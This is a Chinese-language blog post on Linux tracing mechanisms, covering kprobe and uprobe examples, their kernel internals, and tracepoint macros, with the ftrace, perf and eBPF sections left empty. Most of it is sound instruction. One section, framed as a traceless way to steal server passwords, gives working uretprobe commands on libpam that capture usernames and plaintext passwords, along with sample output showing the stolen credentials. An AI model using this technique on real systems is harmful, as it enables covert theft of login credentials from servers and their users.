​									Linux内核的trace机制

#### 前言

​	Linux下的trace机制看上去很多、很杂：strace、ltrace、ftrace、kprobe、uprobe、tracepoint、perf、甚至eBPF。这篇文章主要探讨这些不同的trace之间的关系，以及linux是如何将这些trace联系起来的。

在[Linux-strace-System](https://jvns.ca/blog/2017/07/05/linux-tracing-systems/#ftrace)里将Linux trace机制分为三类：数据源、数据收集处理（来自数据源）、前端（用户交互）。



#### 利用Linux trace 什么

* syscall 系统调用

* kernel functions 内核函数 （例如rootkit）

* userspace functions 用户程序的函数 （例如 程序是否调用了 `strcmp`）

* userspace 或者 kernel 定义的 event。

  



#### 数据源

Linux trace的数据源可以分为两种："probes"（kprobes/uprobes）和 “tracepoints"。

**probe**即”探针“，是指linux在运行时通过动态地修改汇编指令达到跟踪的目的。这种方式很有效，而且理论上可以实现指令级的跟踪（性能低）。

**tracepoint**是指静态地编译进程序的跟踪代码。可以在运行时指定是否在运行到tracepoint的时候导出数据，相较于probe，这种方式性能消耗是更低的。

##### Kprobe

[LWN](https://lwn.net/Articles/132196/)对于kprobes的描述：

```
KProbes is a debugging mechanism for the Linux kernel which can also be used for monitoring events inside a production system. You can use it to weed out performance bottlenecks, log specific events, trace problems etc.
```

基本上，kprobes允许在运行时修改Linux kernel指令代码，在执行到指定的指令时就会执行插入的代码（插桩）。虽然kprobes多被用于跟踪kernel functions的调用，但实际上可以实现跟踪每一条指令（并观察寄存器）。

* 实例

Linux内核树在`samples/kprobes/`提供了kprobe的使用样例（hook `_do_fork`）

```c
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/kprobes.h>

#define MAX_SYMBOL_LEN	64
static char symbol[MAX_SYMBOL_LEN] = "_do_fork";
module_param_string(symbol, symbol, sizeof(symbol), 0644);

/* For each probe you need to allocate a kprobe structure */
static struct kprobe kp = {
	.symbol_name	= symbol,
};

/* kprobe pre_handler: called just before the probed instruction is executed */
static int __kprobes handler_pre(struct kprobe *p, struct pt_regs *regs)
{
	pr_info("<%s> p->addr = 0x%p, ip = %lx, flags = 0x%lx\n",
		p->symbol_name, p->addr, regs->ip, regs->flags);
	/* A dump_stack() here will give a stack backtrace */
	return 0;
}

/* kprobe post_handler: called after the probed instruction is executed */
static void __kprobes handler_post(struct kprobe *p, struct pt_regs *regs,
				unsigned long flags)
{
	pr_info("<%s> p->addr = 0x%p, flags = 0x%lx\n",
		p->symbol_name, p->addr, regs->flags);
}
/*
* fault_handler: this is called if an exception is generated for any
* instruction within the pre- or post-handler, or when Kprobes
* single-steps the probed instruction.
*/
static int handler_fault(struct kprobe *p, struct pt_regs *regs, int trapnr)
{
        pr_info("fault_handler: p->addr = 0x%p, trap #%dn", p->addr, trapnr);
        /* Return 0 because we don't handle the fault. */
        return 0;
}
static int __init kprobe_init(void)
{
	int ret;
	kp.pre_handler = handler_pre;
	kp.post_handler = handler_post;
	kp.fault_handler = handler_fault;
	
	ret = register_kprobe(&kp);
	if (ret < 0) {
		pr_err("register_kprobe failed, returned %d\n", ret);
		return ret;
	}
	pr_info("Planted kprobe at %p\n", kp.addr);
	return 0;
}

static void __exit kprobe_exit(void)
{
	unregister_kprobe(&kp);
	pr_info("kprobe at %p unregistered\n", kp.addr);
}

module_init(kprobe_init)
module_exit(kprobe_exit)
MODULE_LICENSE("GPL");
```

编译后`insmod`，`dmesg`可以看到系统的`_do_fork`函数被调用的信息：

```assembly
root@tree-pc:/kprobe# dmesg | tail
[21687.146320] <_do_fork> p->addr = 0x00000000553ec747, ip = ffffffff9788ee51, flags = 0x246
[21687.146321] <_do_fork> p->addr = 0x00000000553ec747, flags = 0x246
[21694.899424] <_do_fork> p->addr = 0x00000000553ec747, ip = ffffffff9788ee51, flags = 0x246
[21694.899426] <_do_fork> p->addr = 0x00000000553ec747, flags = 0x246
[21694.899650] <_do_fork> p->addr = 0x00000000553ec747, ip = ffffffff9788ee51, flags = 0x246
```

可以看到，kprobes允许对指定的kernel function执行前后进行hook。

* 原理

  kprobes的工作流程（`kernel/kprobes.c`）

  * `register_kprobe`函数注册一个探针地址（通常是函数）

    * `kprobe_addr`根据通过`kallsyms_lookup_name`查询 `kprobe.symbol_name`指定的要hook的函数的真实地址`kprobe.addr`，（也可以直接指定要hook的地址，很少这么使用）

    * `check_kprobe_rereg`检查`kprobe.addr`是否已经注册了kprobe（地址只允许一个）。
    * `prepare_kprobe` -> `arch_prepare_kprobe`
      * 对`kprobe.addr`做一些检查
        * 不允许是**smp-alternatives**保留地址
        * 不允许是**instruction boundary**（相邻的地址上的指令已经被其他kprobes修改）
      * 将被hook地址的指令复制保存到`kprobe.ainsn`
    * 将kprobe插入到hash表 `kprobe_table`中
    * `arm_kprobe` -> `arch_arm_kprobe` 在`x86`模式下，修改被hook地址指令为BREAKPOINT_INSTRUCTION 即`int 3`断点。

  * linux内核执行到`kprobe.addr`（已经被插入int3断点），将调用内核函数`do_int3`处理异常

    * do_int3将调用`kprobe_int3_handler`，后者通过`get_kprobe`从`kprobe_table`表中查找发生int3异常的地址注册的kprobe
    * 执行kprobe.pre_handler（如果存在）
    * 当kprobe.pro_handler返回0（正常结束），或者pre_handler不存在，通过`setup_singlestep`单步执行保存的原始指令
    * 执行原始指令后（int3 异常处理结束），继续执行`kprobe.addr`之后的代码。
    * 当`kprobe`hook的目标函数（地址）执行完后，触发单步执行异常，将由`do_debug` - >`kprobe_debug_handler`处理，后者调用`kprobe.post_handler`

**kretprobes**和kprobes类似，`register_kretprobe`最终调用`register_kprobe`注册一个`kprobe`，不同的是其`pre_handler`是固定的`pre_handler_kretprobe`。该函数调用`arch_prepare_kretprobe`将指定插桩函数的`return address`修改为`kretprobe_trampoline`。

##### uprobes

uprobes和kprobes类似，不过它也允许对userspace functions跟踪。

* 实例

  * 测试代码：

    ```c
    #include <stdio.h>
    #include <stdlib.h>
    
    void user_test()
    {
    	puts("call user_test");
    
    	return ;
    }
    int main(int argc, char const *argv[])
    {
    	user_test();
    	return 0;
    }
    ```

    通过`objdump`获取要跟踪的函数`user_test`的`offset`

    ```assembly
    tree@tree-pc:~/uprobe$ objdump -S ./test | grep user
    000000000000063a <user_test>:
     661:	e8 d4 ff ff ff       	callq  63a <user_test>
    ```

    通过`debugfs`和`tracefs`使用`uprobe`跟踪

    ```
    root@tree-pc:/home/tree/uprobe# echo 'p /home/tree/uprobe/test:0x63a' >> /sys/kernel/debug/tracing/uprobe_events 
    root@tree-pc:/home/tree/uprobe# echo 1 > /sys/kernel/debug/tracing/e
    enabled_functions  events/            
    root@tree-pc:/home/tree/uprobe# echo 1 > /sys/kernel/debug/tracing/e
    enabled_functions  events/            
    root@tree-pc:/home/tree/uprobe# echo 1 > /sys/kernel/debug/tracing/events/uprobes/p_test_0x63a/enable 
    root@tree-pc:/home/tree/uprobe# echo 1 > /sys/kernel/debug/tracing/tracing_on 
    
    tree@tree-pc:~/uprobe$ ./test 
    call user_test
    tree@tree-pc:~/uprobe$ ./test 
    call user_test
    
    root@tree-pc:/home/tree/uprobe# echo 0 > /sys/kernel/debug/tracing/tracing_on
    root@tree-pc:/home/tree/uprobe# cat /sys/kernel/debug/tracing/trace
    # tracer: nop
    #
    # entries-in-buffer/entries-written: 2/2   #P:1
    #
    #                              _-----=> irqs-off
    #                             / _----=> need-resched
    #                            | / _---=> hardirq/softirq
    #                            || / _--=> preempt-depth
    #                            ||| /     delay
    #           TASK-PID   CPU#  ||||    TIMESTAMP  FUNCTION
    #              | |       |   ||||       |         |
                test-33286 [000] d... 27760.485547: p_test_0x63a: (0x556e170a363a)
                test-33287 [000] d... 27762.052302: p_test_0x63a: (0x55e8c04e663a)
    ```

    

uprobes工作原理：

`uprobe`除了`debugfs`和`tracefs`外没有提供其他的接口，通过`file_operations`绑定了特定的功能（kprobes也是这么做的，不过也提供了register接口）
```c
static __init int init_uprobe_trace(void)
{
	int ret;
	...
	trace_create_file("uprobe_events", TRACE_MODE_WRITE, NULL,
				    NULL, &uprobe_events_ops);
	...
	return 0;
}
```
基于`tracefs`，将下述file_operations绑定到`/sys/kernel/debug/tracing/uprobe_events`
```c
static const struct file_operations uprobe_events_ops = {
	.owner		= THIS_MODULE,
	.open		= probes_open,
	.read		= seq_read,
	.llseek		= seq_lseek,
	.release	= seq_release,
	.write		= probes_write,
};
```
* 当向`uprobe_events`写入uprobe event时
`probes_write` -> `create_or_delete_trace_uprobe` -> `trace_uprobe_create` -> `trace_probe_create` -> `__trace_uprobe_create`
  
-> `alloc_trace_uprobe`创建一个`uprobe`并初始化
```c
static struct trace_uprobe *
alloc_trace_uprobe(const char *group, const char *event, int nargs, bool is_ret)
{
	struct trace_uprobe *tu;
	int ret;

	tu = kzalloc(struct_size(tu, tp.args, nargs), GFP_KERNEL);
	if (!tu)
		return ERR_PTR(-ENOMEM);

	ret = trace_probe_init(&tu->tp, event, group, true);
	if (ret < 0)
		goto error;

	dyn_event_init(&tu->devent, &trace_uprobe_ops);
	tu->consumer.handler = uprobe_dispatcher;			// uprobe handler
	if (is_ret)
		tu->consumer.ret_handler = uretprobe_dispatcher;	// retuprobe handler
	init_trace_uprobe_filter(tu->tp.event->filter);
	return tu;

error:
	kfree(tu);

	return ERR_PTR(ret);
}
```
`register_trace_uprobe`注册uprobe
`register_uprobe_event`将uprobe注册到全局probe，同时创建对应的`debugfs`
当对应的uprobe_event 被 `enable`时，`__uprobe_register`
```c
 retry:
	uprobe = alloc_uprobe(inode, offset, ref_ctr_offset);
	if (!uprobe)
		return -ENOMEM;
	if (IS_ERR(uprobe))
		return PTR_ERR(uprobe);

	/*
	 * We can race with uprobe_unregister()->delete_uprobe().
	 * Check uprobe_is_active() and retry if it is false.
	 */
	down_write(&uprobe->register_rwsem);
	ret = -EAGAIN;
	if (likely(uprobe_is_active(uprobe))) {
		consumer_add(uprobe, uc);
		ret = register_for_each_vma(uprobe, uc);
		if (ret)
			__uprobe_unregister(uprobe, uc);
	}
```
`register_for_each_vma`在对应的uprobe文件的进程内存map偏移处下断点（和kprobe类似）
```c
		if (is_register) {
			/* consult only the "caller", new consumer. */
			if (consumer_filter(new,
					UPROBE_FILTER_REGISTER, mm))
				err = install_breakpoint(uprobe, mm, vma, info->vaddr);
		}
```
##### 利用uprobe窃听用户密码
如何无痕的窃取Linux服务器密码
云上常见的窃取服务器密码的方式基本都是“插马”，在`ssh/sshd/pam.so`等文件的用户认证函数中插入一段代码，将认证成功的密码记录在某个文件中或者`curl`外带出去。这种做法很常见，但是很容易被识破，毕竟基础文件被更改了。
那有没有办法做到非侵入式的呢，当然有的，`uprobe`就是一个很好的选择。
uprobe是linux提供的众多trace机制之一，可以用于trace用户态程序、文件的执行。
基本的语法我就不多介绍了，推荐直接读官方文档`uprobetracer.rst`。

uprobe的实现原理和kprobe类似，都是在内存中修改指定函数地址指令为`int 3`，

pam认证的流程也不多讲了，关键的两个api: `pam_authenticate`和`pam_get_authtok`
pam_get_authtok执行完后rdi寄存器指向`pam_handle`结构体，该结构体偏移`48`位置就是认证的用户名`user`；
`rdx`寄存器指向`authtok`，此时是明文的密码；
pam_authenticate的返回值标记了此次认证是否成功。

那么我的思路就是：
uretprobe pam_get_authtok 获取用户名密码，uretprobe获取pam_authenticate返回值判断是不是认证成功（ret=0x0时）
首先获取这两个函数在libpam文件的偏移
```
tree@tree-pc:~/code$ objdump -S /lib/x86_64-linux-gnu/libpam.so.0 | grep pam_authenticate
0000000000003900 <pam_authenticate@@LIBPAM_1.0>:
```
tree@tree-pc:~/code$ objdump -S /lib/x86_64-linux-gnu/libpam.so.0 | grep pam_get_authtok
    3eba:       e8 81 34 00 00          callq  7340 <pam_get_authtok_verify@@LIBPAM_EXTENSION_1.1.1+0x1950>
    4747:       e8 a4 2a 00 00          callq  71f0 <pam_get_authtok_verify@@LIBPAM_EXTENSION_1.1.1+0x1800>
00000000000059c0 <pam_get_authtok@@LIBPAM_EXTENSION_1.1>:
```
接下来就是uprobe跟踪这两个函数，获取我们想要的信息
```
root@tree-pc:/home/tree/code/tracepoint/uprobe# echo 'r /lib/x86_64-linux-gnu/libpam.so.0:0x59c0 username=+u0(+u48(%di)):string password=+u0(+u0(%dx)):string' > /sys/kernel/tracing/uprobe_events 
root@tree-pc:/home/tree/code/tracepoint/uprobe# echo 'r /lib/x86_64-linux-gnu/libpam.so.0:0x3900 ret=$retval' >> /sys/kernel/tracing/uprobe_events 
root@tree-pc:/home/tree/code/tracepoint/uprobe# echo 1 > /sys/kernel/tracing/events/uprobes/p_libpam_0x59c0/enable
root@tree-pc:/home/tree/code/tracepoint/uprobe# echo 1 > /sys/kernel/tracing/events/uprobes/p_libpam_0x3900/enable
root@tree-pc:/home/tree/code/tracepoint/uprobe# cat /sys/kernel/tracing/trace
# tracer: nop
#
# entries-in-buffer/entries-written: 4/4   #P:6
#
#                                _-----=> irqs-off
#                               / _----=> need-resched
#                              | / _---=> hardirq/softirq
#                              || / _--=> preempt-depth
#                              ||| / _-=> migrate-disable
#                              |||| /     delay
#           TASK-PID     CPU#  |||||  TIMESTAMP  FUNCTION
#              | |         |   |||||     |         |
              su-75284   [005] ..... 20126.120031: p_libpam_0x59c0: (0x7feedde3d852 <- 0x7feedea0c9c0) username="root" password="pass123"
              su-75284   [005] ..... 20127.888462: p_libpam_0x3900: (0x5586a3426266 <- 0x7feedea0a900) ret=0x7
              su-75317   [002] ..... 20133.411487: p_libpam_0x59c0: (0x7f1855372852 <- 0x7f1855f419c0) username="root" password="ubt159"
              su-75317   [002] ..... 20133.423021: p_libpam_0x3900: (0x555b081f4266 <- 0x7f1855f3f900) ret=0x0
```
这种无痕的方案就避免了对任何文件的更改，更难以发现。

##### tracepoints

[LWN](https://lwn.net/Articles/379903/)对于**tracepoints**的介绍很详细，

最终要的是内核提供了巧妙的宏定义，允许我们在内核代码中静态的插入一个`tracepoint`：

**DECLARE_TRACE**的定义

```c
#define DECLARE_TRACE(name, proto, args)				\
	__DECLARE_TRACE(name, PARAMS(proto), PARAMS(args),		\
			cpu_online(raw_smp_processor_id()),		\
			PARAMS(void *__data, proto),			\
			PARAMS(__data, args))

#define __DECLARE_TRACE(name, proto, args, cond, data_proto, data_args) \
	extern struct tracepoint __tracepoint_##name;			\
	static inline void trace_##name(proto)				\
	{								\
		if (static_key_false(&__tracepoint_##name.key))		\
			__DO_TRACE(&__tracepoint_##name,		\
				TP_PROTO(data_proto),			\
				TP_ARGS(data_args),			\
				TP_CONDITION(cond),,);			\
		if (IS_ENABLED(CONFIG_LOCKDEP) && (cond)) {		\
			rcu_read_lock_sched_notrace();			\
			rcu_dereference_sched(__tracepoint_##name.funcs);\
			rcu_read_unlock_sched_notrace();		\
		}							\
	}								\
	__DECLARE_TRACE_RCU(name, PARAMS(proto), PARAMS(args),		\
		PARAMS(cond), PARAMS(data_proto), PARAMS(data_args))	\
	static inline int						\
	register_trace_##name(void (*probe)(data_proto), void *data)	\
	{								\
		return tracepoint_probe_register(&__tracepoint_##name,	\
						(void *)probe, data);	\
	}								\
	static inline int						\
	unregister_trace_##name(void (*probe)(data_proto), void *data)	\
	{								\
		return tracepoint_probe_unregister(&__tracepoint_##name,\
						(void *)probe, data);	\
	}								\
	static inline void						\
	check_trace_callback_type_##name(void (*cb)(data_proto))	\
	{								\
	}								\
	static inline bool						\
	trace_##name##_enabled(void)					\
	{								\
		return static_key_false(&__tracepoint_##name.key);	\
	}
```



#### 数据收集与处理机制

##### ftrace

##### perf_events

##### eBPF







#### 参考链接

[Linux-strace-System](https://jvns.ca/blog/2017/07/05/linux-tracing-systems/#ftrace)

[LWN-Kprobes](https://lwn.net/Articles/132196/)

[kprobes script](https://github.com/brendangregg/perf-tools/blob/master/kernel/kprobe)

[linux-ftrace-uprobes](https://www.brendangregg.com/blog/2015-06-28/linux-ftrace-uprobe.html)

[](https://nakryiko.com/categories/bpf/)
[uprobe-trace](https://www.brendangregg.com/blog/2015-06-28/linux-ftrace-uprobe.html)




